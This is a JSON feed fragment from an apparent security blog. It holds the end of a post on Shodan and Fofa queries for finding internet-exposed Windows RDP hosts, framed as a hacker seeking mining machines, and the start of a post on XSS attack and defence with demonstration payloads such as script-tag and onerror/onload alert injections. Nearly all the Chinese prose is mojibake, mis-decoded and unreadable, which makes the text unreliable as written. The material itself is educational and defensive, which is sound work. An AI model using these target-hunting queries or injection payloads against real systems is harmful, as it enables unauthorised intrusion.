:</h4>\n<p>æˆ‘æƒ³æ‰¾äººå¹«æˆ‘æŒ–ç¤¦ï¼Œè€Œä¸”é›»è…¦æœ‰é¡¯å¡æ‰æŒ–çš„å¿«ã€‚</p>\n<h4 id=\"%E8%AA%AA%E6%98%8E-%3A-4\"><a class=\"direct-link\" href=\"#%E8%AA%AA%E6%98%8E-%3A-4\">#</a> èªªæ˜Â :</h4>\n<p>é€™é …æ¸¬è©¦ç”¨åˆ°äº† Shodan ç¨æœ‰çš„åŠŸèƒ½ Screenshotï¼Œæ•…æ¡ˆä¾‹ä¸­åªåŒ…å« Shodan çš„çµæœã€‚RDP(Remote Desktop Protocol) æ˜¯ Windows å…§å»ºçš„é ç«¯æ§åˆ¶åŠŸèƒ½ï¼Œç‰¹é»ä¹‹ä¸€æ˜¯æœƒæŠŠç™»å…¥éçš„ä½¿ç”¨è€…å¸³è™Ÿé¡¯ç¤ºå‡ºä¾†ï¼Œé€™å¤§å¹…é™ä½äº†é§­å®¢æš´åŠ›ç ´è§£é›£åº¦ï¼Œé…åˆé€™å€‹ç‰¹é»å¢åŠ è¦å‰‡ä¹Ÿæ›´å¥½æ‰¾å‡ºå®¹æ˜“ç ´è§£çš„ç›®æ¨™ï¼Œä¸‹åœ–ç‚ºå…¸å‹æ¡ˆä¾‹ï¼Œè€Œä¸”æœ‰ç•«é¢çš„è©±æœ‰é¡¯ç¤ºå¡çš„æ©Ÿæœƒä¹Ÿæ¯”è¼ƒé«˜ã€‚</p>\n<p><img src=\"/img/posts/nick/shodan-fofa/1__sfSazc0IKRr__N7za6sQy5g.png\" alt=\"\"></p>\n<h4 id=\"%E6%90%9C%E5%B0%8B%E6%A2%9D%E4%BB%B6-%3A-4\"><a class=\"direct-link\" href=\"#%E6%90%9C%E5%B0%8B%E6%A2%9D%E4%BB%B6-%3A-4\">#</a> æœå°‹æ¢ä»¶Â :</h4>\n<ol>\n<li>Port: 3389</li>\n<li>has_screenshotÂ : true</li>\n</ol>\n<h4 id=\"shodan-%3A-1039052-%E7%AD%86%E7%B5%90%E6%9E%9C\"><a class=\"direct-link\" href=\"#shodan-%3A-1039052-%E7%AD%86%E7%B5%90%E6%9E%9C\">#</a> ShodanÂ : 1039052 ç­†çµæœ</h4>\n<p><img src=\"/img/posts/nick/shodan-fofa/1__NfjZ8g1tEIzc__CCnxBYytg.png\" alt=\"\"></p>\n<h3 id=\"%E6%A1%88%E4%BE%8B-5%3A-%E9%81%A0%E7%AB%AF%E6%8E%A7%E5%88%B6-(windows-rdp)\"><a class=\"direct-link\" href=\"#%E6%A1%88%E4%BE%8B-5%3A-%E9%81%A0%E7%AB%AF%E6%8E%A7%E5%88%B6-(windows-rdp)\">#</a> æ¡ˆä¾‹ 5: é ç«¯æ§åˆ¶ (WindowsÂ RDP)</h3>\n<h4 id=\"%E9%A7%AD%E5%AE%A2-%3A-5\"><a class=\"direct-link\" href=\"#%E9%A7%AD%E5%AE%A2-%3A-5\">#</a> é§­å®¢Â :</h4>\n<p>æˆ‘æƒ³æ‰¾äººå¹«æˆ‘æŒ–ç¤¦ï¼Œè€Œä¸”æˆ‘åªè¦æœ€æ–°çš„é›»è…¦ã€‚</p>\n<h4 id=\"%E8%AA%AA%E6%98%8E-%3A-5\"><a class=\"direct-link\" href=\"#%E8%AA%AA%E6%98%8E-%3A-5\">#</a> èªªæ˜Â :</h4>\n<p>é€™é …æ¸¬è©¦ç”¨åˆ° Fofa ç¨æœ‰çš„åŠŸèƒ½ After è·Ÿé‚è¼¯åˆ¤æ–·å¼ï¼Œæ•…æ¡ˆä¾‹ä¸­åªåŒ…å« Fofa çš„çµæœã€‚é€™çµæœé™¤äº†æ‹¿ä¾†æ”»æ“Šä¹‹å¤–ä¹Ÿå¯ä»¥ç”¨æ–¼åˆ†æï¼Œå¾çµæœå¯ä»¥çŸ¥é“ä»Šå¹´å¤šäº†å¤šå°‘å°é–‹å•Ÿé ç«¯åŠŸèƒ½çš„ Windowsã€‚</p>\n<h4 id=\"%E6%90%9C%E5%B0%8B%E6%A2%9D%E4%BB%B6-%3A-5\"><a class=\"direct-link\" href=\"#%E6%90%9C%E5%B0%8B%E6%A2%9D%E4%BB%B6-%3A-5\">#</a> æœå°‹æ¢ä»¶Â :</h4>\n<ol>\n<li>PortÂ : 3389</li>\n<li>AfterÂ : 2021â€“01â€“01</li>\n<li>å›æ‡‰å…§å®¹åŒ…å«Â : Windows 10 æˆ– Windows Server 2012</li>\n</ol>\n<h4 id=\"fofa-%3A-4438635-%E7%AD%86%E7%B5%90%E6%9E%9C\"><a class=\"direct-link\" href=\"#fofa-%3A-4438635-%E7%AD%86%E7%B5%90%E6%9E%9C\">#</a> FofaÂ : 4438635 ç­†çµæœ</h4>\n<p><img src=\"/img/posts/nick/shodan-fofa/1__hIcAaYG7rpWfkLzwdI9Xfg.png\" alt=\"\"></p>\n<h2 id=\"%E7%B8%BD%E7%B5%90\"><a class=\"direct-link\" href=\"#%E7%B8%BD%E7%B5%90\">#</a> ç¸½çµ</h2>\n<p>é›–ç„¶æ¡ˆä¾‹ä¸­åªä»‹ç´¹åˆ°ä¸€å°éƒ¨ä»½çš„æœå°‹è¦å‰‡ï¼Œä½†å¯ä»¥å¾é€™äº›æ¡ˆä¾‹çŸ¥é“æœå°‹å¼•æ“çš„å½±éŸ¿åŠ›ï¼Œé€™é‚Šæ•´ç†å¹¾å€‹é˜²ç¯„æ–¹æ³•èˆ‡è¦æ³¨æ„çš„åœ°æ–¹ã€‚</p>\n<h4 id=\"%E5%A6%82%E4%BD%95%E9%81%BF%E5%85%8D%E5%BE%9E-shodan-%E6%88%96-fofa-%E8%A2%AB%E6%89%BE%E5%88%B0-%3F\"><a class=\"direct-link\" href=\"#%E5%A6%82%E4%BD%95%E9%81%BF%E5%85%8D%E5%BE%9E-shodan-%E6%88%96-fofa-%E8%A2%AB%E6%89%BE%E5%88%B0-%3F\">#</a> å¦‚ä½•é¿å…å¾ Shodan æˆ– Fofa è¢«æ‰¾åˆ°Â ?</h4>\n<ol>\n<li>å®¶ç”¨ç¶²è·¯è«‹é¿å…ä½¿ç”¨å›ºå®š IPï¼Œå›ºå®šIPç­‰æ–¼æ˜¯æœ‰å€‹å›ºå®šé–€ç‰Œï¼Œé§­å®¢æƒ³è¦æ”»æ“Šä¹Ÿæ¯”è¼ƒå®¹æ˜“æ‰¾åˆ°ä½ ï¼Œå°¤å…¶æ˜¯ç”¨æœå°‹å¼•æ“ã€‚</li>\n<li>æœ‰é ç«¯æœå‹™éœ€æ±‚çš„æœ‹å‹é¿å…ä½¿ç”¨å¸³å¯†ç™»å…¥ï¼Œç›¡é‡é¸æ“‡æ†‘è­‰æˆ–å…¬ç§é‘°ã€‚</li>\n<li>ç¶²ç«™å»ºè­°æ¶åœ¨é›²ç«¯ä¸»æ©Ÿï¼Œåƒæ˜¯ AWS æˆ– GCP ç­‰ï¼Œèº²åœ¨å¤§å…¬å¸çš„ä¿è­·å‚˜ä¸‹ã€‚</li>\n<li>Shodan å’Œ Fofa çš„æ›´æ–°éƒ½ä¸æ˜¯å³æ™‚çš„ï¼Œæ‰€ä»¥ä¸ç®¡æ˜¯æ–°æœå‹™ä¸Šç·šæˆ–æ˜¯é˜²è­·æªæ–½æ›´æ–°ä¸€é€±å¾Œéƒ½è¦å†æ¬¡åˆ°æœå°‹å¼•æ“ä¸Šç¢ºèªæ˜¯å¦æœƒè¢«æ‰¾åˆ°ã€‚</li>\n</ol>\n<h4 id=\"shodan-%E6%88%96-fofa-%E4%BD%BF%E7%94%A8%E4%B8%8A%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E5%9C%B0%E6%96%B9-%3F\"><a class=\"direct-link\" href=\"#shodan-%E6%88%96-fofa-%E4%BD%BF%E7%94%A8%E4%B8%8A%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E5%9C%B0%E6%96%B9-%3F\">#</a> Shodan æˆ– Fofa ä½¿ç”¨ä¸Šè¦æ³¨æ„çš„åœ°æ–¹Â ?</h4>\n<ol>\n<li>ä¸ç®¡åœ¨ Shodan æˆ– Fofa å…è²»ç”¨æˆ¶æ¯å¤©çš„æœå°‹é‡ä¸Šé™éƒ½ä¸é«˜ï¼Œæ¸¬è©¦éç¨‹ä¸­å¾ˆå®¹æ˜“è¶…æ¨™å°è‡´ç„¡æ³•ç¹¼çºŒä½¿ç”¨ï¼Œæ‰€ä»¥å¹³å¸¸ä½¿ç”¨æ™‚å¤šåŠ ä¸€äº›éæ¿¾æ¢ä»¶ï¼Œä¸åªèƒ½æå‡æº–ç¢ºåº¦é‚„å¯ä»¥é¿å…å¤ªå¿«åˆ°é”ä¸Šé™ï¼Œè¬ä¸€é‚„æ˜¯è¶…å‡ºé¡åº¦è©±å°±åªå¥½å»ºç«‹ä¸€å€‹æ–°å¸³è™Ÿæ‰èƒ½ç¹¼çºŒä½¿ç”¨ã€‚</li>\n<li>Shodan çš„æœå°‹æ–¹å¼ç¶²è·¯ä¸Šæœ‰å¾ˆå¤šç¯„ä¾‹å¯ä»¥åƒè€ƒï¼Œå®˜æ–¹ä¹Ÿæœ‰æ•´ç†ä¸€äº›æœ€å¸¸è¢«ä½¿ç”¨çš„æœå°‹æ–¹å¼åœ¨ Explore é é¢(<a href=\"https://www.shodan.io/explore\">https://www.shodan.io/explore</a>)ï¼Œä¸çŸ¥é“å¾ä½•ä¸‹æ‰‹æ™‚ä¸å¦¨å…ˆçœ‹çœ‹åˆ¥äººæ€éº¼æ‰¾ã€‚</li>\n<li>Fofa æœ‰è·Ÿ Google é¡ä¼¼çš„æœå°‹é æ¸¬åŠŸèƒ½ï¼Œå¯è¼¸å…¥è¼ƒçŸ­çš„é—œéµå­—å¾Œçœ‹çœ‹æœ‰æ²’æœ‰æ¨è–¦çš„æŸ¥è©¢æ–¹å¼ï¼Œç›®æ¨™é‚„ä¸ç²¾ç¢ºæ™‚éå¸¸å¯¦ç”¨ã€‚</li>\n<li>Fofa çš„æœç´¢çµæœä¸­åŒ…å«ç¶²ç«™æ‰€ä»¥æœ‰äº›ä¸åŒçš„çµæœæ˜¯ä¾†è‡ªåŒä¸€å€‹ IPï¼Œå»ºè­°è¨ˆç®—æ•¸é‡æ™‚ä»¥ç¨ç«‹ IP ç‚ºæº–(Shodan ä¹Ÿæ˜¯ä»¥ IP æ•¸é‡ä¾†è¨ˆç®—çµæœæ•¸)ï¼Œé€šå¸¸ Fofa æ‰¾åˆ°çš„ IP æ•¸é‡æ¯” Shodan å¤šï¼ŒShodan æ‰¾ä¸åˆ°å•é¡Œæ™‚å¯ä»¥è©¦è©¦ Fofaã€‚</li>\n<li>åœ¨æœå°‹çµæœå¸¸å¸¸æœƒå‡ºç¾ä¸€å€‹ä¸å¤ªæ˜é¡¯çš„æé†’ï¼Œå‘Šè¨´ä½ é€™å€‹ç›®æ¨™å¯èƒ½æ˜¯honeypotsï¼Œé€™æ™‚å€™æ³¨æ„ä¸è¦é€£éå»ï¼Œå¾ˆå¯èƒ½å—åˆ°åæ“Šæˆ–è³‡è¨Šç«Šå–ï¼Œæœ€å¥½å¾å›æ‡‰å…§å®¹ä¸­æ‰¾å‡ºèˆ‡ä¸€èˆ¬è¨­å‚™çš„å·®åˆ¥ï¼Œæ–°å¢è¦å‰‡ä¾†éæ¿¾æ‰é€™äº›ç„¡ç”¨è³‡è¨Šã€‚</li>\n</ol>\n<p><img src=\"/img/posts/nick/shodan-fofa/1____8dp4s__lb__bhrc__TYXey6A.png\" alt=\"\"></p>\n<p>å¦‚æœå°é€™é¡å‹æŠ€è¡“æœ‰èˆˆè¶£çš„è©±è¨˜å¾—å¹«å¿™æ‹æ‰‹èˆ‡åˆ†äº«ï¼Œæ•¸é‡å¤ å¤šï¼Œä¹‹å¾Œæœƒå†åŠ é–‹ä¸€ç¯‡åˆ†äº«æ›´é€²éšçš„ç”¨æ³•èˆ‡ä»˜è²»ç”¨æˆ¶æ‰æœ‰çš„å¼·å¤§åŠŸèƒ½ï¼Œæœ‰ä»»ä½•è³‡å®‰æ–¹é¢ç›¸é—œçš„å•é¡Œéƒ½æ­¡è¿ç•™è¨€è¨è«–ï¼Œæˆ–è€…ç›´æ¥åˆ° Cymetrics å°‹æ±‚å”åŠ©ã€‚</p>\n<h3 id=\"%E5%90%8D%E8%A9%9E%E8%A7%A3%E9%87%8B\"><a class=\"direct-link\" href=\"#%E5%90%8D%E8%A9%9E%E8%A7%A3%E9%87%8B\">#</a> åè©è§£é‡‹</h3>\n<blockquote>\n<p>è¨» 1Â : èœœç½ (honeypots)é€šå¸¸å½è£æˆçœ‹ä¼¼æœ‰åˆ©ç”¨åƒ¹å€¼çš„<a href=\"https://zh.wikipedia.org/wiki/%E7%B6%B2%E8%B7%AF\" title=\"ç¶²è·¯\">ç¶²è·¯</a>ã€è³‡æ–™ã€<a href=\"https://zh.wikipedia.org/wiki/%E9%9B%BB%E8%85%A6\" title=\"é›»è…¦\">é›»è…¦</a>ç³»çµ±ï¼Œä¸¦æ•…æ„è¨­å®šäº† å¼±é»ï¼Œç”¨ä¾†å¸å¼•<a href=\"https://zh.wikipedia.org/wiki/%E9%A7%AD%E5%AE%A2\" title=\"é§­å®¢\">é§­å®¢</a>æ”»æ“Šã€‚ç”±æ–¼èœœç½äº‹å¯¦ä¸Šä¸¦æœªå°ç¶²è·¯æä¾›ä»»ä½•æœ‰åƒ¹å€¼çš„æœå‹™ï¼Œæ‰€ä»¥ä»»ä½•å°èœœç½çš„å˜—è©¦éƒ½æ˜¯å¯ç–‘çš„ã€‚èœœç½ä¸­é‚„å¯èƒ½è£æœ‰ç›£æ§è»Ÿé«”ï¼Œç”¨ä»¥ç›£è¦–é§­å®¢å…¥ä¾µå¾Œçš„èˆ‰å‹•ã€‚</p>\n</blockquote>\n<h3 id=\"%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99\"><a class=\"direct-link\" href=\"#%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99\">#</a> åƒè€ƒè³‡æ–™</h3>\n<blockquote>\n<p><a href=\"https://www.shodan.io/\">https://www.shodan.io/</a><br>\n<a href=\"https://fofa.so/\">https://fofa.so/</a></p>\n</blockquote>\n",
      "date_published": "2021-06-28T08:00:00+08:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/huli/xss-attack-and-defense/",
      "url": "https://tech-blog.cymetrics.io/posts/huli/xss-attack-and-defense/",
      "title": "æ·ºè«‡ XSS æ”»æ“Šèˆ‡é˜²ç¦¦çš„å„å€‹ç’°ç¯€",
      "content_html": "<h2 id=\"%E5%89%8D%E8%A8%80\"><a class=\"direct-link\" href=\"#%E5%89%8D%E8%A8%80\">#</a> å‰è¨€</h2>\n<!-- summary -->\n<p>è«‡åˆ° XSSï¼ˆCross-site scriptingï¼‰ï¼Œè¨±å¤šäººå¯èƒ½éƒ½åªæƒ³åˆ°ã€Œå°±æ˜¯ç¶²ç«™ä¸Šè¢«æ”»æ“Šè€…æ¤å…¥ç¨‹å¼ç¢¼ã€ï¼Œä½†è‹¥æ˜¯ä»”ç´°å»æƒ³çš„è©±ï¼Œæœƒç™¼ç¾é€™ä¹‹ä¸­å…¶å¯¦é‚„æœ‰å¾ˆå¤šç’°ç¯€éƒ½å¯ä»¥å†æ·±å…¥æ¢è¨ã€‚</p>\n<!-- summary -->\n<p>è€Œæˆ‘æ‰€è¬‚çš„é€™äº›ã€Œç’°ç¯€ã€ï¼Œä¹Ÿå¯ä»¥ç†è§£æˆä¸åŒçš„ã€Œé—œå¡ã€ã€‚</p>\n<p>èˆ‰ä¾‹ä¾†èªªï¼Œç¬¬ä¸€é—œç•¶ç„¶å°±æ˜¯ç›¡å¯èƒ½é˜²æ­¢è‡ªå·±çš„ç¶²ç«™è¢« XSS æ”»æ“Šï¼Œä¸è¦è®“æ”»æ“Šè€…åœ¨ç¶²ç«™ä¸­èƒ½å¤ æ¤å…¥ç¨‹å¼ç¢¼ã€‚è€Œã€Œè®“æ”»æ“Šè€…åœ¨ç¶²ç«™ä¸­æ¤å…¥ç¨‹å¼ç¢¼ã€é€™ä»¶äº‹ï¼Œåˆå¯ä»¥å¾€ä¸‹å†ç´°åˆ†æˆä¸åŒåœ°æ–¹çš„æ¤å…¥ï¼Œä¾‹å¦‚èªª HTML çš„æ¤å…¥ï¼Œæˆ–è€…æ˜¯ HTML å…ƒç´ å±¬æ€§ä¸­çš„æ¤å…¥ï¼Œåˆæˆ–æ˜¯ JavaScript ç¨‹å¼ç¢¼ä¸­çš„æ¤å…¥ï¼Œé€™äº›éƒ½æœ‰è‘—ä¸åŒçš„æ”»æ“Šä»¥åŠé˜²ç¦¦æ–¹å¼ã€‚</p>\n<p>è€Œé™¤äº†é˜²æ­¢è¢«æ¤å…¥ç¨‹å¼ç¢¼ä»¥å¤–ï¼Œé˜²å®ˆæ–¹æ‡‰è©²é‚„è¦é€²ä¸€æ­¥å»æƒ³ï¼šã€Œé‚£å¦‚æœçœŸçš„ä¸å¹¸è¢«æ¤å…¥ç¨‹å¼ç¢¼äº†ï¼Œå¯ä»¥æ€éº¼è¾¦ï¼Ÿã€</p>\n<p>é€™å°±æ˜¯ç¬¬äºŒå€‹é—œå¡ã€‚é›–ç„¶èªªç¬¬ä¸€é—œæˆ‘å€‘å·²ç¶“ç›¡å¯èƒ½åšå¥½æº–å‚™äº†ï¼Œä½†é›£ä¿ä¸æœƒæœ‰æ¼æ´ç”¢ç”Ÿï¼Œå› æ­¤å®ˆå¥½ç¬¬ä¸€é—œæ˜¯ä¸å¤ çš„ï¼Œä¹Ÿè¦å°ç¬¬äºŒé—œé€²è¡Œé˜²å®ˆã€‚</p>\n<p>å‡è¨­ä»Šå¤©æ”»æ“Šè€…çœŸçš„æ‰¾åˆ°ä¸€å€‹åœ°æ–¹æ¤å…¥ç¨‹å¼ç¢¼ï¼Œé‚£æˆ‘å€‘æ˜¯ä¸æ˜¯å¯ä»¥æƒ³è¾¦æ³•é˜»æ­¢å®ƒåŸ·è¡Œï¼Ÿé€™å°±æ˜¯ CSPï¼ˆContent Security Policyï¼‰å‡ºå ´çš„æ™‚å€™äº†ï¼Œè—‰ç”±è¨­å®šä¸€äº›è¦å‰‡è®“ä¸åˆæ³•çš„ç¨‹å¼ç¢¼ç„¡æ³•åŸ·è¡Œã€‚ä¾‹å¦‚èªªå¯ä»¥è®“ inline çš„ JavaScript ç„¡æ³•åŸ·è¡Œï¼Œé‚£ <code>&lt;img src=x onerror=alert(1)&gt;</code> å°±æœƒè®Šå¾—ç„¡æ•ˆã€‚</p>\n<p>è‹¥æ˜¯æ”»æ“Šè€…çœŸçš„å¾ˆå²å®³ï¼Œé€£ CSP çš„è¦å‰‡éƒ½ç¹éäº†å‘¢ï¼Ÿé€™æ™‚å°±é€²å…¥åˆ°ç¬¬ä¸‰é—œäº†ï¼Œç¬¬ä¸‰é—œçš„å‡è¨­æ˜¯æ”»æ“Šè€…å·²ç¶“èƒ½å¤ åœ¨ç¶²ç«™ä¸ŠåŸ·è¡Œä»»æ„ç¨‹å¼ç¢¼ã€‚</p>\n<p>é€™æ™‚å€™é‚„å¯ä»¥é˜²å®ˆä»€éº¼å‘¢ï¼Ÿé‚£å°±æ˜¯è©¦åœ–æŠŠæå®³æ§åˆ¶åˆ°æœ€ä½ã€‚</p>\n<p>ä»¥ Medium é€™ç¨®éƒ¨è½æ ¼çš„å¹³å°ä¾†èªªï¼Œè‹¥æ˜¯å¯ä»¥åˆ©ç”¨ XSS æŠŠåˆ¥äººçš„å¸³è™Ÿå¥ªèµ°ï¼ˆaccount takevoerï¼‰ï¼Œå°±æ˜¯å€‹åš´é‡çš„æ¼æ´ï¼›æˆ–æ˜¯å› ç‚º Medium æœ‰ä»˜è²»ç‰†çš„åŠŸèƒ½ï¼Œå› æ­¤è‹¥æ˜¯èƒ½é€é XSS æŠŠéŒ¢è½‰åˆ°æ”»æ“Šè€…çš„å¸³è™Ÿï¼Œä¹Ÿæœƒæ˜¯ä¸€å€‹å¾ˆåš´é‡çš„å•é¡Œã€‚</p>\n<p>è€Œæˆ‘å€‘è¦åœ¨ã€Œç¶²ç«™å·²ç¶“è¢« XSSã€çš„å‰æä¸‹ï¼Œè©¦åœ–å»é˜²ç¦¦é€™äº›æ”»æ“Šã€‚</p>\n<p>æ¥è‘—ï¼Œå°±è®“æˆ‘å€‘ä¾†çœ‹çœ‹ä¸åŒçš„é—œå¡æœ‰å“ªäº›ä¸åŒçš„é˜²ç¦¦æ–¹æ³•ã€‚</p>\n<h2 id=\"%E7%AC%AC%E4%B8%80%E9%97%9C%EF%BC%9A%E9%98%BB%E6%AD%A2%E6%94%BB%E6%93%8A%E8%80%85%E5%9C%A8%E7%B6%B2%E7%AB%99%E6%A4%8D%E5%85%A5%E7%A8%8B%E5%BC%8F%E7%A2%BC\"><a class=\"direct-link\" href=\"#%E7%AC%AC%E4%B8%80%E9%97%9C%EF%BC%9A%E9%98%BB%E6%AD%A2%E6%94%BB%E6%93%8A%E8%80%85%E5%9C%A8%E7%B6%B2%E7%AB%99%E6%A4%8D%E5%85%A5%E7%A8%8B%E5%BC%8F%E7%A2%BC\">#</a> ç¬¬ä¸€é—œï¼šé˜»æ­¢æ”»æ“Šè€…åœ¨ç¶²ç«™æ¤å…¥ç¨‹å¼ç¢¼</h2>\n<p>è¦é˜²æ­¢ XSS çš„ç¬¬ä¸€æ­¥ï¼Œç•¶ç„¶å°±æ˜¯é˜»æ­¢æ”»æ“Šè€…åœ¨ç¶²ç«™ä¸Šæ¤å…¥ä»–å€‘æƒ³è¦çš„æ±è¥¿ï¼Œæ ¸å¿ƒç²¾ç¥å¯ä»¥æ¿ƒç¸®æˆä¸€å¥ï¼š</p>\n<blockquote>\n<p>æ°¸é ä¸è¦ç›¸ä¿¡ä½¿ç”¨è€…çš„è¼¸å…¥</p>\n</blockquote>\n<p>åªè¦æ˜¯æœ‰è¼¸å…¥çš„åœ°æ–¹ï¼Œéƒ½æ‡‰è©²å»åšé©—è­‰ã€‚åœ¨è¼¸å‡ºä¸è¢«ä¿¡ä»»çš„è³‡æ–™æ™‚æ‡‰è©²è¦åšè·³è„«ï¼ˆescapeï¼‰ã€‚</p>\n<p>èˆ‰ä¾‹ä¾†èªªï¼Œä»Šå¤©æœ‰å€‹åœ°æ–¹å¯ä»¥è®“ä½¿ç”¨è€…è¨­å®šè‡ªå·±çš„æš±ç¨±ï¼Œå› ç‚ºä½¿ç”¨è€…å¯ä»¥è‡ªå·±è¼¸å…¥æ±è¥¿ï¼Œæ‰€ä»¥åœ¨è¼¸å‡ºé€™é‚Šçš„è³‡æ–™æ™‚å°±è¦ç‰¹åˆ¥æ³¨æ„ã€‚</p>\n<p>å¦‚æœåœ¨ render æ™‚å°±æ˜¯ç›´æ¥æŠŠä½¿ç”¨è€…çš„è¼¸å…¥åŸå°ä¸å‹• render å‡ºä¾†ï¼Œé‚£è‹¥æ˜¯ä½¿ç”¨è€…è¼¸å…¥çš„æš±ç¨±æ˜¯ï¼š<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>ï¼Œä»»ä½•äººç€è¦½é€™ä¸€é çš„æ™‚å€™å°±æœƒçœ‹åˆ°ç•«é¢è·³å‡ºä¸€å€‹ alertï¼Œå› ç‚ºæš±ç¨±è¼¸å…¥çš„æ±è¥¿è¢«ç•¶ä½œç¨‹å¼ç¢¼åŸ·è¡Œäº†ã€‚</p>\n<p>é€™ç¨®æ”»æ“Šå¯ä»¥æˆç«‹çš„ä¸»å› å°±æ˜¯ä½¿ç”¨è€…çš„è¼¸å…¥è®Šæˆäº†ç¨‹å¼ç¢¼çš„ä¸€éƒ¨åˆ†ï¼Œå°è‡´æœªé æœŸçš„è¡Œç‚ºã€‚</p>\n<p>è¦é˜²æ­¢é€™ç¨®è¡Œç‚ºï¼Œå°±æ˜¯åœ¨ render çš„æ™‚å€™è¦åšè·³è„«ã€‚ä¾‹å¦‚èªªè¦å…ˆæŠŠ <code>&lt;</code> è½‰æˆ <code>&amp;lt</code>ï¼Œé€™æ¨£åœ¨ç•«é¢ä¸Šçœ‹åˆ°çš„ä¾ç„¶æ˜¯ <code>&lt;</code>ï¼Œä½†æ˜¯å° parser ä¾†èªªé‚£ä¸¦ä¸æ˜¯æ¨™ç±¤é–‹å§‹çš„ç¬¦è™Ÿï¼Œè€Œæ˜¯æ–‡å­—çš„ <code>&lt;</code>ï¼Œå°±ä¸æœƒè¢«ç•¶ä½œ HTML æ¨™ç±¤ä¾†è§£æã€‚</p>\n<p>å¦‚æ­¤ä¸€ä¾†ï¼Œå°±èƒ½é˜²æ­¢æ”»æ“Šè€…æ¤å…¥ç¨‹å¼ç¢¼ã€‚</p>\n<p>ä¸éï¼Œé€™é‚„åªæ˜¯å°è·³è„«çš„ç²—æ·ºç†è§£è€Œå·²ï¼ŒçœŸæ­£éœ€è¦æ³¨æ„çš„æ˜¯åœ¨ä¸åŒçš„æƒ…å¢ƒä¹‹ä¸‹ï¼Œå¯èƒ½æœƒéœ€è¦ç”¨ä¸åŒçš„æ–¹å¼è·³è„«ï¼Œå°±å¦‚åŒé€™å…©ç¯‡è¬›çš„ä¸€æ¨£ï¼š</p>\n<ol>\n<li><a href=\"https://www.ptt.cc/bbs/Soft_Job/M.1582437563.A.6F7.html\">Re: [è¨è«–] ç‚ºä»€éº¼SQLæ³¨å…¥å’ŒXSSæ¼æ´æœƒé€™éº¼æ°¾æ¿«?(1)</a></li>\n<li><a href=\"https://www.ptt.cc/bbs/Soft_Job/M.1582441681.A.A7B.html\">Re: [è¨è«–] ç‚ºä»€éº¼SQLæ³¨å…¥å’ŒXSSæ¼æ´æœƒé€™éº¼æ°¾æ¿«?(2)</a></li>\n</ol>\n<p>å‡è¨­ä½ åªæœ‰æƒ³åˆ°èªªè¦å°æ¨™ç±¤åšè·³è„«ï¼ŒæŠŠ <code>&lt;&gt;</code> é€™å…©å€‹ç¬¦è™Ÿéƒ½åšäº† escapeï¼Œé‚£ç¢ºå¯¦æ²’æœ‰è¾¦æ³•ç›´æ¥æ’å…¥æ¨™ç±¤ã€‚å¯æ˜¯ï¼Œå¦‚æœ render æš±ç¨±çš„åœ°æ–¹æ˜¯é€™æ¨£å‘¢ï¼Ÿ</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>&lt;?= avatar_url ?><span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">alt</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>&lt;?= nickname ?><span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span><span class=\"token punctuation\">></span></span><span class=\"token prolog\">&lt;?= nickname ?></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre>\n<p>é™¤äº†åœ¨ div è£¡é¢è¼¸å‡ºæš±ç¨±ä¹‹å¤–ï¼Œä¹Ÿæœƒåœ¨ img çš„ alt æ¨™ç±¤è£¡æŠŠæš±ç¨± render å‡ºä¾†ã€‚é€™æ™‚å€™å¦‚æœåªè·³è„«äº† <code>&lt;&gt;</code> æ˜¯ä¸å¤ çš„ï¼Œå› ç‚ºå¦‚æœæˆ‘è®“ nickname è®Šæˆ <code>&quot; onload=&quot;alert(1)</code> çš„è©±ï¼Œçµåˆèµ·ä¾†å°±æœƒè®Šæˆï¼š</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>avatar_url<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">alt</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token punctuation\">\"</span></span> <span class=\"token special-attr\"><span class=\"token attr-name\">onload</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token value javascript language-javascript\"><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></span><span class=\"token punctuation\">\"</span></span></span> <span class=\"token punctuation\">/></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span><span class=\"token punctuation\">></span></span>\" onload=\"alert(1)<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre>\n<p>æ”»æ“Šè€…å¯ä»¥åˆ©ç”¨ <code>&quot;</code> é—œé–‰å‰é¢çš„å±¬æ€§ï¼Œç„¶å¾Œå‰µå‡ºä¸€å€‹æ–°çš„å±¬æ€§ <code>onload</code>ï¼Œé”æˆ HTML æ¨™ç±¤å±¬æ€§åˆ©ç”¨çš„ XSSã€‚</p>\n<p>æ‰€ä»¥å¸¸è¦‹çš„ç‰¹æ®Šç¬¦è™Ÿåƒæ˜¯ <code>&quot;'&lt;&gt;</code> éƒ½è¦å»åš escapeï¼Œæ‰èƒ½ç¢ºä¿åœ¨ä¸åŒåœ°æ–¹æ™‚éƒ½æœ‰é˜²ç¦¦æ•ˆæœã€‚è€Œé€™é»å…¶å¯¦è¨±å¤šç¨‹å¼èªè¨€æˆ–æ˜¯ framework 